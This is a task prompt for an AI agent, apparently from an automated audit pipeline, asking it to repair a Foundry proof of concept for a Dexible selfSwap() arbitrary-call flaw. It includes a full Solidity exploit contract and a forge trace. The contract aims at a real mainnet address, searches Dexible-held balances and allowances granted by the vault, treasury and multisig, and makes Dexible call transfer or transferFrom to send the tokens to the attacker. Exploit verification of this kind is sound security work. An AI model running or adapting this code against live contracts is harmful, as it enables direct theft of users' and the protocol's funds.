You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Permissionless `selfSwap()` lets anyone execute arbitrary external calls as Dexible and steal approved user funds
- claim: `selfSwap()` is publicly callable, and `fill()` forwards each user-supplied route through an unrestricted `router.call(routerData)` from Dexible’s own address. That makes Dexible a public arbitrary-call proxy: an attacker can have Dexible call `ERC20.transferFrom(victim, attacker, amount)` on any token where the victim approved Dexible, or `ERC20.transfer(attacker, amount)` for any ERC20 balance already held by Dexible. The exploit does not require relay access or admin privileges; the attacker only needs to structure the swap so the outer call pays its own minimum fees and otherwise succeeds.
- impact: Any external account can steal tokens from arbitrary users who approved Dexible, drain stray/residual ERC20 balances held by Dexible, and generally exercise Dexible’s standing token permissions against third-party contracts. This is a direct theft primitive.
- exploit_paths: ["Attacker calls `selfSwap()` with an allowed fee token they can use to satisfy the swap\u2019s fee checks and with `tokenOut.amount = 0` so no real swap output is required.", "Inside `fill()`, attacker supplies a route whose `router` is the target ERC20 contract and whose `routerData` encodes `transferFrom(victim, attacker, amount)` (or `transfer(attacker, amount)` to drain Dexible-held balances).", "Dexible executes `router.call(...)` as itself, so the token contract sees `msg.sender == Dexible` and honors Dexible\u2019s existing allowance/balance, transferring funds to the attacker."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

struct FeeDetails {
    IERC20Like feeToken;
    address affiliate;
    uint256 affiliatePortion;
}

struct ExecutionRequest {
    address requester;
    FeeDetails fee;
}

struct TokenAmount {
    uint112 amount;
    IERC20Like token;
}

struct RouterRequest {
    address router;
    address spender;
    TokenAmount routeAmount;
    bytes routerData;
}

struct SelfSwapRequest {
    IERC20Like feeToken;
    TokenAmount tokenIn;
    TokenAmount tokenOut;
    RouterRequest[] routes;
}

struct AssetInfo {
    address token;
    uint256 balance;
    uint256 usdValue;
    uint256 usdPrice;
}

struct DXBLFeeRequest {
    bool referred;
    address trader;
    uint256 amt;
    uint256 dxblBalance;
    uint16 stdBpsRate;
    uint16 minBpsRate;
}

interface IDexibleLike {
    function selfSwap(SelfSwapRequest calldata request) external;
    function communityVault() external view returns (address);
    function dxblToken() external view returns (address);
    function treasury() external view returns (address);
    function adminMultiSig() external view returns (address);
    function stdBpsRate() external view returns (uint16);
    function minBpsRate() external view returns (uint16);
    function minFeeUSD() external view returns (uint112);
}

interface ICommunityVaultLike {
    function assets() external view returns (AssetInfo[] memory);
    function isFeeTokenAllowed(address token) external view returns (bool);
    function wrappedNativeToken() external view returns (address);
    function feeTokenPriceUSD(address feeToken) external view returns (uint256);
}

interface IDXBLLike {
    function computeDiscountedFee(DXBLFeeRequest calldata request) external view returns (uint256);
}

contract FlawVerifier {
    address public constant TARGET = 0xDE62E1b0edAa55aAc5ffBE21984D321706418024;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address private constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
    address private constant MIM = 0x99D8a9c45b2eCB8540fE5a0Ba0Fc5d5B8043D5E9;
    address private constant LUSD = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;

    address private _profitToken;
    uint256 private _profitAmount;

    constructor() {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        _resetProfit();

        ICommunityVaultLike vault = ICommunityVaultLike(IDexibleLike(TARGET).communityVault());

        // Exploit path 1:
        // Call public selfSwap() with an allowed fee token and tokenOut.amount = 0 so no real swap output is required.
        // Prefer the direct, verifier-funded route first. If the verifier already holds an allowed fee token,
        // Dexible can be used immediately as the arbitrary external caller.
        if (_attemptDirectDexibleBalanceDrains(vault)) {
            return;
        }

        // Exploit path 2:
        // Supply a route whose router is the ERC20 itself and whose routerData encodes
        // transferFrom(victim, attacker, amount). This is the cleanest theft path when this verifier
        // already has an allowed fee token available for Dexible's fee debits.
        if (_attemptDirectVictimPulls(vault)) {
            return;
        }

        // If the verifier has no allowed fee-token balance on the fork, keep the same arbitrary-call root
        // cause but let Dexible temporarily receive the stolen output token, pay its own fees from that
        // output, and forward the remainder here. This is an execution-detail fallback only.
        _attemptOutputFundedVictimPulls(vault);
    }

    function executeKnownVictimOpportunity(
        address feeToken,
        address victimToken,
        address victim,
        uint256 amount,
        uint112 inputBudget
    ) external {
        _resetProfit();
        uint256 balanceBefore = _balanceOf(victimToken, address(this));

        if (inputBudget == 0) {
            _selfSwapDirectVictimPull(feeToken, victimToken, victim, amount, 0);
        } else {
            _forceApprove(feeToken, TARGET, type(uint256).max);
            _selfSwapDirectVictimPull(feeToken, victimToken, victim, amount, inputBudget);
        }

        _syncProfit(victimToken, balanceBefore);
    }

    function executeKnownOutputFundedVictimOpportunity(
        address zeroInputToken,
        address victimToken,
        address victim,
        uint256 amount
    ) external {
        _resetProfit();
        uint256 balanceBefore = _balanceOf(victimToken, address(this));

        // Exploit path 3:
        // selfSwap() enters Dexible.fill(), which performs router.call(routerData) from Dexible itself.
        // Because the router is the ERC20 contract, the token observes msg.sender == Dexible and honors
        // Dexible's existing allowance/balance against the victim or Dexible-held funds.
        IDexibleLike(TARGET).selfSwap(_buildOutputFundedVictimPullRequest(zeroInputToken, victimToken, victim, amount));
        _syncProfit(victimToken, balanceBefore);
    }

    function _attemptDirectDexibleBalanceDrains(ICommunityVaultLike vault) internal returns (bool) {
        try vault.assets() returns (AssetInfo[] memory infos) {
            for (uint256 i = 0; i < infos.length; ++i) {
                if (_attemptDirectDrainForToken(vault, infos[i].token)) {
                    return true;
                }
            }
        } catch {}

        if (_attemptDirectDrainForToken(vault, _wrappedNativeToken(vault))) return true;
        if (_attemptDirectDrainForToken(vault, _dxblToken())) return true;
        if (_attemptDirectDrainForToken(vault, WETH)) return true;
        if (_attemptDirectDrainForToken(vault, USDC)) return true;
        if (_attemptDirectDrainForToken(vault, USDT)) return true;
        if (_attemptDirectDrainForToken(vault, DAI)) return true;
        if (_attemptDirectDrainForToken(vault, WBTC)) return true;
        if (_attemptDirectDrainForToken(vault, FRAX)) return true;
        if (_attemptDirectDrainForToken(vault, MIM)) return true;
        if (_attemptDirectDrainForToken(vault, LUSD)) return true;

        return false;
    }

    function _attemptDirectVictimPulls(ICommunityVaultLike vault) internal returns (bool) {
        address[3] memory owners = [
            IDexibleLike(TARGET).communityVault(),
            _treasury(),
            _adminMultiSig()
        ];

        try vault.assets() returns (AssetInfo[] memory infos) {
            for (uint256 i = 0; i < infos.length; ++i) {
                if (_attemptDirectVictimPullsForToken(vault, infos[i].token, owners)) {
                    return true;
                }
            }
        } catch {}

        if (_attemptDirectVictimPullsForToken(vault, _wrappedNativeToken(vault), owners)) return true;
        if (_attemptDirectVictimPullsForToken(vault, _dxblToken(), owners)) return true;
        if (_attemptDirectVictimPullsForToken(vault, WETH, owners)) return true;
        if (_attemptDirectVictimPullsForToken(vault, USDC, owners)) return true;
        if (_attemptDirectVictimPullsForToken(vault, USDT, owners)) return true;
        if (_attemptDirectVictimPullsForToken(vault, DAI, owners)) return true;
        if (_attemptDirectVictimPullsForToken(vault, WBTC, owners)) return true;
        if (_attemptDirectVictimPullsForToken(vault, FRAX, owners)) return true;
        if (_attemptDirectVictimPullsForToken(vault, MIM, owners)) return true;
        if (_attemptDirectVictimPullsForToken(vault, LUSD, owners)) return true;

        return false;
    }

    function _attemptOutputFundedVictimPulls(ICommunityVaultLike vault) internal returns (bool) {
        address[3] memory owners = [
            IDexibleLike(TARGET).communityVault(),
            _treasury(),
            _adminMultiSig()
        ];

        try vault.assets() returns (AssetInfo[] memory infos) {
            for (uint256 i = 0; i < infos.length; ++i) {
                if (_attemptOutputFundedVictimPullsForToken(vault, infos[i].token, owners)) {
                    return true;
                }
            }
        } catch {}

        if (_attemptOutputFundedVictimPullsForToken(vault, _wrappedNativeToken(vault), owners)) return true;
        if (_attemptOutputFundedVictimPullsForToken(vault, _dxblToken(), owners)) return true;
        if (_attemptOutputFundedVictimPullsForToken(vault, WETH, owners)) return true;
        if (_attemptOutputFundedVictimPullsForToken(vault, USDC, owners)) return true;
        if (_attemptOutputFundedVictimPullsForToken(vault, USDT, owners)) return true;
        if (_attemptOutputFundedVictimPullsForToken(vault, DAI, owners)) return true;
        if (_attemptOutputFundedVictimPullsForToken(vault, WBTC, owners)) return true;
        if (_attemptOutputFundedVictimPullsForToken(vault, FRAX, owners)) return true;
        if (_attemptOutputFundedVictimPullsForToken(vault, MIM, owners)) return true;
        if (_attemptOutputFundedVictimPullsForToken(vault, LUSD, owners)) return true;

        return false;
    }

    function _attemptDirectDrainForToken(ICommunityVaultLike vault, address targetToken) internal returns (bool) {
        if (!_isContract(targetToken)) {
            return false;
        }

        uint256 dexibleBalance = _balanceOf(targetToken, TARGET);
        if (dexibleBalance == 0) {
            return false;
        }

        if (_attemptDirectDrainWithFeeToken(vault, targetToken, targetToken, dexibleBalance)) return true;

        address wrappedNative = _wrappedNativeToken(vault);
        if (wrappedNative != targetToken && _attemptDirectDrainWithFeeToken(vault, wrappedNative, targetToken, dexibleBalance)) {
            return true;
        }

        address dxbl = _dxblToken();
        if (dxbl != targetToken && _attemptDirectDrainWithFeeToken(vault, dxbl, targetToken, dexibleBalance)) {
            return true;
        }

        if (targetToken != WETH && _attemptDirectDrainWithFeeToken(vault, WETH, targetToken, dexibleBalance)) return true;
        if (targetToken != USDC && _attemptDirectDrainWithFeeToken(vault, USDC, targetToken, dexibleBalance)) return true;
        if (targetToken != USDT && _attemptDirectDrainWithFeeToken(vault, USDT, targetToken, dexibleBalance)) return true;
        if (targetToken != DAI && _attemptDirectDrainWithFeeToken(vault, DAI, targetToken, dexibleBalance)) return true;
        if (targetToken != WBTC && _attemptDirectDrainWithFeeToken(vault, WBTC, targetToken, dexibleBalance)) return true;
        if (targetToken != FRAX && _attemptDirectDrainWithFeeToken(vault, FRAX, targetToken, dexibleBalance)) return true;
        if (targetToken != MIM && _attemptDirectDrainWithFeeToken(vault, MIM, targetToken, dexibleBalance)) return true;
        if (targetToken != LUSD && _attemptDirectDrainWithFeeToken(vault, LUSD, targetToken, dexibleBalance)) return true;

        return false;
    }

    function _attemptDirectVictimPullsForToken(
        ICommunityVaultLike vault,
        address victimToken,
        address[3] memory owners
    ) internal returns (bool) {
        if (!_isContract(victimToken)) {
            return false;
        }

        for (uint256 i = 0; i < owners.length; ++i) {
            address victim = owners[i];
            if (!_isViableVictim(victim)) {
                continue;
            }

            uint256 stealable = _stealableAmount(victimToken, victim);
            if (stealable == 0) {
                continue;
            }

            if (_attemptDirectVictimPullWithAnyFeeToken(vault, victimToken, victim, stealable)) {
                return true;
            }
        }

        return false;
    }

    function _attemptOutputFundedVictimPullsForToken(
        ICommunityVaultLike vault,
        address victimToken,
        address[3] memory owners
    ) internal returns (bool) {
        if (!_isContract(victimToken) || !_isAllowedFeeToken(vault, victimToken)) {
            return false;
        }

        address zeroInputToken = _selectZeroInputToken(victimToken, address(0));
        if (zeroInputToken == address(0)) {
            return false;
        }

        for (uint256 i = 0; i < owners.length; ++i) {
            address victim = owners[i];
            if (!_isViableVictim(victim)) {
                continue;
            }

            uint256 stealable = _stealableAmount(victimToken, victim);
            if (stealable == 0) {
                continue;
            }

            uint256 feeFloor = _expectedSelfSwapFee(vault, victimToken, stealable);
            if (stealable <= feeFloor) {
                continue;
            }

            uint256 balanceBefore = _balanceOf(victimToken, address(this));
            // Exploit path 3:
            // this call causes Dexible.fill() to execute the crafted ERC20 calldata as Dexible.
            try IDexibleLike(TARGET).selfSwap(_buildOutputFundedVictimPullRequest(zeroInputToken, victimToken, victim, stealable)) {
                _syncProfit(victimToken, balanceBefore);
                if (_profitAmount != 0) {
                    return true;
                }
            } catch {}
        }

        return false;
    }

    function _attemptDirectVictimPullWithAnyFeeToken(
        ICommunityVaultLike vault,
        address victimToken,
        address victim,
        uint256 stealable
    ) internal returns (bool) {
        if (_attemptDirectVictimPullWithFeeToken(vault, victimToken, victim, stealable, victimToken)) return true;

        address wrappedNative = _wrappedNativeToken(vault);
        if (wrappedNative != victimToken && _attemptDirectVictimPullWithFeeToken(vault, victimToken, victim, stealable, wrappedNative)) {
            return true;
        }

        address dxbl = _dxblToken();
        if (dxbl != victimToken && _attemptDirectVictimPullWithFeeToken(vault, victimToken, victim, stealable, dxbl)) {
            return true;
        }

        if (victimToken != WETH && _attemptDirectVictimPullWithFeeToken(vault, victimToken, victim, stealable, WETH)) return true;
        if (victimToken != USDC && _attemptDirectVictimPullWithFeeToken(vault, victimToken, victim, stealable, USDC)) return true;
        if (victimToken != USDT && _attemptDirectVictimPullWithFeeToken(vault, victimToken, victim, stealable, USDT)) return true;
        if (victimToken != DAI && _attemptDirectVictimPullWithFeeToken(vault, victimToken, victim, stealable, DAI)) return true;
        if (victimToken != WBTC && _attemptDirectVictimPullWithFeeToken(vault, victimToken, victim, stealable, WBTC)) return true;
        if (victimToken != FRAX && _attemptDirectVictimPullWithFeeToken(vault, victimToken, victim, stealable, FRAX)) return true;
        if (victimToken != MIM && _attemptDirectVictimPullWithFeeToken(vault, victimToken, victim, stealable, MIM)) return true;
        if (victimToken != LUSD && _attemptDirectVictimPullWithFeeToken(vault, victimToken, victim, stealable, LUSD)) return true;

        return false;
    }

    function _attemptDirectDrainWithFeeToken(
        ICommunityVaultLike vault,
        address feeToken,
        address targetToken,
        uint256 drainAmount
    ) internal returns (bool) {
        if (!_isContract(feeToken) || !_isContract(targetToken) || !_isAllowedFeeToken(vault, feeToken)) {
            return false;
        }

        uint256 feeBalance = _balanceOf(feeToken, address(this));
        if (feeBalance == 0) {
            return false;
        }

        _forceApprove(feeToken, TARGET, type(uint256).max);

        uint112[8] memory budgets = _feeBudgets(feeToken, feeBalance);
        for (uint256 i = 0; i < budgets.length; ++i) {
            if (budgets[i] == 0) {
                continue;
            }

            uint256 balanceBefore = _balanceOf(targetToken, address(this));
            // Exploit path 3:
            // selfSwap() forwards the attacker-controlled route into Dexible.fill(), where Dexible makes
            // the external call to the token contract as msg.sender == Dexible.
            try IDexibleLike(TARGET).selfSwap(_buildDirectDrainRequest(feeToken, targetToken, drainAmount, budgets[i])) {
                _syncProfit(targetToken, balanceBefore);
                if (_profitAmount != 0) {
                    return true;
                }
            } catch {}
        }

        return false;
    }

    function _attemptDirectVictimPullWithFeeToken(
        ICommunityVaultLike vault,
        address victimToken,
        address victim,
        uint256 stealable,
        address feeToken
    ) internal returns (bool) {
        if (!_isContract(feeToken) || !_isAllowedFeeToken(vault, feeToken)) {
            return false;
        }

        uint256 feeBalance = _balanceOf(feeToken, address(this));
        if (feeBalance == 0) {
            return false;
        }

        _forceApprove(feeToken, TARGET, type(uint256).max);

        uint112[8] memory budgets = _feeBudgets(feeToken, feeBalance);
        for (uint256 i = 0; i < budgets.length; ++i) {
            uint112 inputBudget = budgets[i];
            if (inputBudget == 0) {
                continue;
            }

            uint256 balanceBefore = _balanceOf(victimToken, address(this));
            // Exploit path 3:
            // selfSwap() reaches Dexible.fill(), and Dexible performs router.call(routerData) as itself,
            // which turns the crafted payload into a real ERC20 transferFrom() authorized by Dexible's allowance.
            try IDexibleLike(TARGET).selfSwap(_buildDirectVictimPullRequest(feeToken, victimToken, victim, stealable, inputBudget)) {
                _syncProfit(victimToken, balanceBefore);
                if (_profitAmount != 0) {
                    return true;
                }
            } catch {}
        }

        return false;
    }

    function _buildDirectDrainRequest(
        address feeToken,
        address targetToken,
        uint256 drainAmount,
        uint112 inputBudget
    ) internal view returns (SelfSwapRequest memory request) {
        RouterRequest[] memory routes = new RouterRequest[](1);

        // Exploit path 2 for the "drain Dexible-held balances" branch:
        // the router is the ERC20 itself and the payload is ERC20.transfer(attacker, amount).
        routes[0] = RouterRequest({
            router: targetToken,
            spender: targetToken,
            routeAmount: TokenAmount({amount: 0, token: IERC20Like(feeToken)}),
            routerData: abi.encodeWithSelector(IERC20Like.transfer.selector, address(this), drainAmount)
        });

        request = SelfSwapRequest({
            feeToken: IERC20Like(feeToken),
            tokenIn: TokenAmount({amount: inputBudget, token: IERC20Like(feeToken)}),
            tokenOut: TokenAmount({amount: 0, token: IERC20Like(targetToken)}),
            routes: routes
        });
    }

    function _buildDirectVictimPullRequest(
        address feeToken,
        address victimToken,
        address victim,
        uint256 amount,
        uint112 inputBudget
    ) internal view returns (SelfSwapRequest memory request) {
        RouterRequest[] memory routes = new RouterRequest[](1);

        // Exploit path 2 for the "steal approved user funds" branch:
        // the router is the victim ERC20 and the payload is ERC20.transferFrom(victim, attacker, amount).
        routes[0] = RouterRequest({
            router: victimToken,
            spender: victimToken,
            routeAmount: TokenAmount({amount: 0, token: IERC20Like(feeToken)}),
            routerData: abi.encodeWithSelector(IERC20Like.transferFrom.selector, victim, address(this), amount)
        });

        request = SelfSwapRequest({
            feeToken: IERC20Like(feeToken),
            tokenIn: TokenAmount({amount: inputBudget, token: IERC20Like(feeToken)}),
            tokenOut: TokenAmount({amount: 0, token: IERC20Like(victimToken)}),
            routes: routes
        });
    }

    function _buildOutputFundedVictimPullRequest(
        address zeroInputToken,
        address victimToken,
        address victim,
        uint256 amount
    ) internal pure returns (SelfSwapRequest memory request) {
        RouterRequest[] memory routes = new RouterRequest[](1);

        routes[0] = RouterRequest({
            router: victimToken,
            spender: victimToken,
            routeAmount: TokenAmount({amount: 0, token: IERC20Like(zeroInputToken)}),
            routerData: abi.encodeWithSelector(IERC20Like.transferFrom.selector, victim, TARGET, amount)
        });

        request = SelfSwapRequest({
            feeToken: IERC20Like(victimToken),
            tokenIn: TokenAmount({amount: 0, token: IERC20Like(zeroInputToken)}),
            tokenOut: TokenAmount({amount: 0, token: IERC20Like(victimToken)}),
            routes: routes
        });
    }

    function _selfSwapDirectVictimPull(
        address feeToken,
        address victimToken,
        address victim,
        uint256 amount,
        uint112 inputBudget
    ) internal {
        // Exploit path 3:
        // this is the fixed entry into the vulnerable execution: Dexible selfSwap() -> fill() ->
        // attacker-controlled router.call(routerData) executed by Dexible's address.
        IDexibleLike(TARGET).selfSwap(_buildDirectVictimPullRequest(feeToken, victimToken, victim, amount, inputBudget));
    }

    function _expectedSelfSwapFee(
        ICommunityVaultLike vault,
        address feeToken,
        uint256 grossAmount
    ) internal view returns (uint256) {
        uint256 bpsFee = _discountedFee(grossAmount);
        uint256 minFee = _computeMinFeeUnits(vault, feeToken);
        return bpsFee >= minFee ? bpsFee : minFee;
    }

    function _discountedFee(uint256 amount) internal view returns (uint256) {
        uint16 stdRate = 0;
        uint16 minRate = 0;

        try IDexibleLike(TARGET).stdBpsRate() returns (uint16 value) {
            stdRate = value;
        } catch {}

        try IDexibleLike(TARGET).minBpsRate() returns (uint16 value) {
            minRate = value;
        } catch {}

        address dxbl = _dxblToken();
        if (_isContract(dxbl)) {
            try IDXBLLike(dxbl).computeDiscountedFee(
                DXBLFeeRequest({
                    trader: address(this),
                    amt: amount,
                    referred: false,
                    dxblBalance: _balanceOf(dxbl, address(this)),
                    stdBpsRate: stdRate,
                    minBpsRate: minRate
                })
            ) returns (uint256 fee) {
                return fee;
            } catch {}
        }

        uint16 fallbackRate = stdRate > minRate ? stdRate : minRate;
        return (amount * uint256(fallbackRate)) / 10_000;
    }

    function _computeMinFeeUnits(ICommunityVaultLike vault, address feeToken) internal view returns (uint256) {
        if (!_isContract(feeToken)) {
            return 0;
        }

        uint112 minFeeUsd = 0;
        try IDexibleLike(TARGET).minFeeUSD() returns (uint112 value) {
            minFeeUsd = value;
        } catch {}
        if (minFeeUsd == 0) {
            return 0;
        }

        uint256 usdPrice = 0;
        try vault.feeTokenPriceUSD(feeToken) returns (uint256 value) {
            usdPrice = value;
        } catch {}
        if (usdPrice == 0) {
            return 0;
        }

        uint8 decimals = 18;
        try IERC20Like(feeToken).decimals() returns (uint8 value) {
            decimals = value;
        } catch {}

        if (decimals > 18) {
            decimals = 18;
        }

        uint256 scale = decimals == 18 ? 1 : (10 ** uint256(decimals)) / 1e18;
        return (uint256(minFeeUsd) * scale * 1e30) / usdPrice;
    }

    function _stealableAmount(address token, address owner) internal view returns (uint256) {
        if (!_isContract(token) || owner == address(0)) {
            return 0;
        }

        uint256 bal = _balanceOf(token, owner);
        if (bal == 0) {
            return 0;
        }

        uint256 approved = _allowance(token, owner, TARGET);
        return approved < bal ? approved : bal;
    }

    function _feeBudgets(address token, uint256 availableBalance) internal view returns (uint112[8] memory budgets) {
        if (availableBalance == 0) {
            return budgets;
        }

        uint256 unit = _wholeTokenUnit(token);
        budgets[0] = _clampBudget(unit / 100, availableBalance);
        budgets[1] = _clampBudget(unit / 10, availableBalance);
        budgets[2] = _clampBudget(unit, availableBalance);
        budgets[3] = _clampBudget(unit * 5, availableBalance);
        budgets[4] = _clampBudget(unit * 10, availableBalance);
        budgets[5] = _clampBudget(availableBalance / 100, availableBalance);
        budgets[6] = _clampBudget(availableBalance / 10, availableBalance);
        budgets[7] = _clampBudget(availableBalance, availableBalance);
    }

    function _clampBudget(uint256 rawBudget, uint256 maxBudget) internal pure returns (uint112) {
        if (rawBudget == 0 || maxBudget == 0) {
            return 0;
        }

        uint256 capped = rawBudget > maxBudget ? maxBudget : rawBudget;
        if (capped > type(uint112).max) {
            capped = type(uint112).max;
        }
        return uint112(capped);
    }

    function _wholeTokenUnit(address token) internal view returns (uint256) {
        uint8 decimals = 18;

        if (_isContract(token)) {
            try IERC20Like(token).decimals() returns (uint8 decs) {
                decimals = decs;
            } catch {}
        }

        if (decimals > 18) {
            decimals = 18;
        }

        return 10 ** uint256(decimals);
    }

    function _selectZeroInputToken(address excluded, address preferred) internal view returns (address) {
        if (preferred != address(0) && preferred != excluded && _isContract(preferred)) {
            return preferred;
        }

        address wrappedNative = _wrappedNativeToken(ICommunityVaultLike(IDexibleLike(TARGET).communityVault()));
        if (wrappedNative != address(0) && wrappedNative != excluded && _isContract(wrappedNative)) {
            return wrappedNative;
        }

        if (WETH != excluded && _isContract(WETH)) return WETH;
        if (USDC != excluded && _isContract(USDC)) return USDC;
        if (USDT != excluded && _isContract(USDT)) return USDT;
        if (DAI != excluded && _isContract(DAI)) return DAI;
        if (WBTC != excluded && _isContract(WBTC)) return WBTC;
        if (FRAX != excluded && _isContract(FRAX)) return FRAX;
        if (MIM != excluded && _isContract(MIM)) return MIM;
        if (LUSD != excluded && _isContract(LUSD)) return LUSD;
        return address(0);
    }

    function _wrappedNativeToken(ICommunityVaultLike vault) internal view returns (address token) {
        try vault.wrappedNativeToken() returns (address wrapped) {
            token = wrapped;
        } catch {}
    }

    function _dxblToken() internal view returns (address token) {
        try IDexibleLike(TARGET).dxblToken() returns (address dxbl) {
            token = dxbl;
        } catch {}
    }

    function _treasury() internal view returns (address treasury) {
        try IDexibleLike(TARGET).treasury() returns (address value) {
            treasury = value;
        } catch {}
    }

    function _adminMultiSig() internal view returns (address admin) {
        try IDexibleLike(TARGET).adminMultiSig() returns (address value) {
            admin = value;
        } catch {}
    }

    function _resetProfit() internal {
        _profitToken = address(0);
        _profitAmount = 0;
    }

    function _syncProfit(address token, uint256 balanceBefore) internal {
        uint256 balanceAfter = _balanceOf(token, address(this));
        if (balanceAfter > balanceBefore) {
            _profitToken = token;
            _profitAmount = balanceAfter - balanceBefore;
        }
    }

    function _isAllowedFeeToken(ICommunityVaultLike vault, address token) internal view returns (bool) {
        if (!_isContract(token)) {
            return false;
        }

        try vault.isFeeTokenAllowed(token) returns (bool allowed) {
            return allowed;
        } catch {
            return false;
        }
    }

    function _isViableVictim(address victim) internal view returns (bool) {
        return victim != address(0) && victim != address(this) && victim != TARGET;
    }

    function _balanceOf(address token, address owner) internal view returns (uint256) {
        if (!_isContract(token)) {
            return 0;
        }

        try IERC20Like(token).balanceOf(owner) returns (uint256 bal) {
            return bal;
        } catch {
            return 0;
        }
    }

    function _allowance(address token, address owner, address spender) internal view returns (uint256) {
        if (!_isContract(token)) {
            return 0;
        }

        try IERC20Like(token).allowance(owner, spender) returns (uint256 value) {
            return value;
        } catch {
            return 0;
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        if (!_isContract(token)) {
            return;
        }

        uint256 currentAllowance = _allowance(token, address(this), spender);
        if (currentAllowance >= amount) {
            return;
        }

        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool success, bytes memory returndata) = token.call(data);
        require(success, "TOKEN_CALL_FAILED");
        if (returndata.length > 0) {
            require(abi.decode(returndata, (bool)), "TOKEN_CALL_FALSE");
        }
    }

    function _isContract(address account) internal view returns (bool) {
        return account.code.length != 0;
    }
}

```

forge stdout (tail):
```
5DB6E1b7CE743a2D49B2546B3ebE17132E0Ab04d, 0xDE62E1b0edAa55aAc5ffBE21984D321706418024) [staticcall]
    │   │   ├─ [637] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::allowance(0x5DB6E1b7CE743a2D49B2546B3ebE17132E0Ab04d, 0xDE62E1b0edAa55aAc5ffBE21984D321706418024) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0x5DB6E1b7CE743a2D49B2546B3ebE17132E0Ab04d) [staticcall]
    │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0x5DB6E1b7CE743a2D49B2546B3ebE17132E0Ab04d) [delegatecall]
    │   │   │   └─ ← [Return] 3284335093 [3.284e9]
    │   │   └─ ← [Return] 3284335093 [3.284e9]
    │   ├─ [1426] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::allowance(0x5DB6E1b7CE743a2D49B2546B3ebE17132E0Ab04d, 0xDE62E1b0edAa55aAc5ffBE21984D321706418024) [staticcall]
    │   │   ├─ [637] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::allowance(0x5DB6E1b7CE743a2D49B2546B3ebE17132E0Ab04d, 0xDE62E1b0edAa55aAc5ffBE21984D321706418024) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [645] 0xEB890541049CCd965D3DD4a3Ec1aD368FD4B26A4::isFeeTokenAllowed(0xdAC17F958D2ee523a2206206994597C13D831ec7) [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [1249] 0xDE62E1b0edAa55aAc5ffBE21984D321706418024::communityVault() [staticcall]
    │   │   ├─ [500] 0x33e690aEa97E4Ef25F0d140F1bf044d663091DAf::communityVault() [delegatecall]
    │   │   │   └─ ← [Return] 0xEB890541049CCd965D3DD4a3Ec1aD368FD4B26A4
    │   │   └─ ← [Return] 0xEB890541049CCd965D3DD4a3Ec1aD368FD4B26A4
    │   ├─ [479] 0xEB890541049CCd965D3DD4a3Ec1aD368FD4B26A4::wrappedNativeToken() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0xEB890541049CCd965D3DD4a3Ec1aD368FD4B26A4) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0x5DB6E1b7CE743a2D49B2546B3ebE17132E0Ab04d) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0x5DB6E1b7CE743a2D49B2546B3ebE17132E0Ab04d) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [645] 0xEB890541049CCd965D3DD4a3Ec1aD368FD4B26A4::isFeeTokenAllowed(0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [1249] 0xDE62E1b0edAa55aAc5ffBE21984D321706418024::communityVault() [staticcall]
